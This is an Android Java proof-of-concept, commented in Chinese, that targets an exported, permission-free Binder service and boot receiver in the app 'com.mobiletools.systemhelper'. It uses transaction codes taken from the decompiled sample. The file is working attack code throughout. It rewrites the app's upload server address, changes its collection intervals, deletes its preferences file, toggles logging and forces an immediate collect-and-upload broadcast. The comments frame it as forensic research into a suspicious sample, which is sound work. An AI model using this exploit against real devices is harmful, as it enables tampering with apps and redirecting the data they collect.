package dev.poc.syshelperprobe;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.Parcel;

/**
 * 对 SystemHelper 暴露的 RegisterHelperService 做 Binder 事务投递
 *
 * 目标服务在清单里是 android:exported="true" 且没有 android:permission
 * 所以任意本机应用 bind 成功后即可直接 transact
 *
 * 事务码与参数形态取自样本 smali 的 onTransact
 * com/mobiletools/systemhelper/service/a$a.smali
 * code 1 = a(String)  写 serverAddress
 * code 2 = a(int)     写三个采集间隔
 * code 3 = b()        删 shared_prefs 整个 xml
 * code 4 = a(boolean) 写日志开关
 * code 5 = a()        读日志开关
 */
public final class probe {

    public static final String TARGETPKG = "com.mobiletools.systemhelper";
    public static final String SERVICECLS = "com.mobiletools.systemhelper.service.RegisterHelperService";
    public static final String RECEIVERCLS = "com.mobiletools.systemhelper.control.OnBootReceiver";
    public static final String ACTION = "com.mobiletools.systemhelper.service.IRegisterHelperService";
    public static final String DESCRIPTOR = ACTION;

    // 目标侧默认地址，用于还原
    public static final String DEFAULTURL = "http://dm.wo.com.cn:18080/register";

    public static final int TXSETURL = 1;
    public static final int TXSETINTERVAL = 2;
    public static final int TXWIPEPREF = 3;
    public static final int TXSETLOG = 4;
    public static final int TXGETLOG = 5;

    private probe() {
    }

    /**
     * 绑定用的显式 Intent
     * 显式组件名可绕开包可见性过滤，action 保留是为了兼容隐式绑定的老路径
     */
    public static Intent buildintent() {
        Intent i = new Intent(ACTION);
        i.setClassName(TARGETPKG, SERVICECLS);
        return i;
    }

    /**
     * 写 serverAddress
     * 落点是 com_mobiletools_systemhelper_preference，MODE_MULTI_PROCESS
     * 上报线程每次发之前都重读该键，所以改完不需要重启目标进程
     */
    public static void setaddress(IBinder binder, String url) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeString(url);
            binder.transact(TXSETURL, data, reply, 0);
            reply.readException();
        } catch (Exception e) {
            throw new IllegalStateException("setaddress 失败: " + e, e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * 改三个采集间隔
     * 目标侧会派生 scheduleInterval=i*8/5 与 signalInfoInterval=i*9/5
     * 该调用没有反向接口读回原值，属破坏性写，只在取证时手动用
     */
    public static void setinterval(IBinder binder, int ms) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(ms);
            binder.transact(TXSETINTERVAL, data, reply, 0);
            reply.readException();
        } catch (Exception e) {
            throw new IllegalStateException("setinterval 失败: " + e, e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * 删 shared_prefs/com_mobiletools_systemhelper_preference.xml
     * 破坏性操作，PoC 不接到界面上，只留接口
     */
    public static void wipeprefs(IBinder binder) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            binder.transact(TXWIPEPREF, data, reply, 0);
            reply.readException();
        } catch (Exception e) {
            throw new IllegalStateException("wipeprefs 失败: " + e, e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * 开关调试日志
     * 打开后目标才会往 logcat 打 RegisterThread 一类日志，可用于旁证
     */
    public static void setlog(IBinder binder, boolean on) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(on ? 1 : 0);
            binder.transact(TXSETLOG, data, reply, 0);
            reply.readException();
        } catch (Exception e) {
            throw new IllegalStateException("setlog 失败: " + e, e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * 读回日志开关
     * 整套接口里唯一有返回值的读操作，用来证明字节确实写进了目标进程的 prefs
     */
    public static boolean getlog(IBinder binder) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            binder.transact(TXGETLOG, data, reply, 0);
            reply.readException();
            return reply.readInt() != 0;
        } catch (Exception e) {
            throw new IllegalStateException("getlog 失败: " + e, e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * 给导出的 OnBootReceiver 发一条自定义 action 的广播
     * onReceive 只有 action 为 BOOT_COMPLETED 或 QUICKBOOT_POWERON 时才走开机分支
     * 其他 action 落进 else 分支，直接执行 b.a(ctx,"B") 的采集加上报
     * 等于把「等 4 分钟或等 6 小时」压成立即触发
     */
    public static void sendtrigger(Context ctx) {
        Intent i = new Intent();
        i.setClassName(TARGETPKG, RECEIVERCLS);
        i.setAction("dev.poc.syshelperprobe.TRIGGER");
        ctx.sendBroadcast(i);
    }

    /**
     * 探测目标服务是否存在
     * 显式 ComponentName 不依赖 queries 声明，但清单里仍写了 queries 供 getPackageInfo 用
     */
    public static boolean serviceready(Context ctx) {
        Intent i = buildintent();
        return ctx.getPackageManager().resolveService(i, 0) != null;
    }

    public static ComponentName component() {
        return new ComponentName(TARGETPKG, SERVICECLS);
    }
}
